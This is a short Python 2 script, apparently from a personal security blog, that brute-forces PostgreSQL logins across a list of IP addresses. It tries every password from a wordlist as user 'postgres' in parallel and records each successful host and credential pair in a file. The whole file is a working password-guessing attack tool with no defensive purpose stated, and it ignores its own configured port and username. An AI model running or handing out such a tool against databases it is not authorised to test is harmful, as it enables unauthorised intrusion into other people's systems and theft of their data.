# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun
import psycopg2
import time
import multiprocessing
import ConfigParser

login_timeout=10

def success(x):
    with open('success.txt', 'a+')as a:
        a.write(x + "\n")

def brute_post(ip,username,passwords,port):
    for password in passwords:
        print 'Checking>>>Postql:' + ip + '@' + username + ':' + password + ':'  + str(port)
        try:
            connx = psycopg2.connect(host=ip, port=5432, user='postgres', password=password)
            success('Postql:'+ip + ':' + str(port) + '|' + username + ':' + password)
            return 'Postql'
        except Exception,e:
            #print e
            pass

if __name__ == '__main__':
    multiprocessing.freeze_support()

    cfg = ConfigParser.ConfigParser()
    cfg.read('Config.ini')
    user = cfg.get("Config", "user")
    thread_s = int(cfg.get("Config", "threads"))
    port = int(cfg.get("Config", "port"))
    print '\n\n     POSTQL SCAN'
    print '         USER:' + user
    print '         PORT:' + str(port)
    print '         THREADS:' + str(thread_s)

    New_start = raw_input('INPUT IP LIST TXT:')  # line:190
    New_start = New_start.replace('"', '').replace("'", '')
    IP_list = list(set([x.strip() for x in open(New_start,'r').readlines()]))

    Password_list_ = list(set([x.strip() for x in open('password.txt','r').readlines()]))

    p = multiprocessing.Pool(thread_s)

    for ip in IP_list:
        p.apply_async(brute_post, args=(ip,user,Password_list_,port))
    p.close()
    p.join()
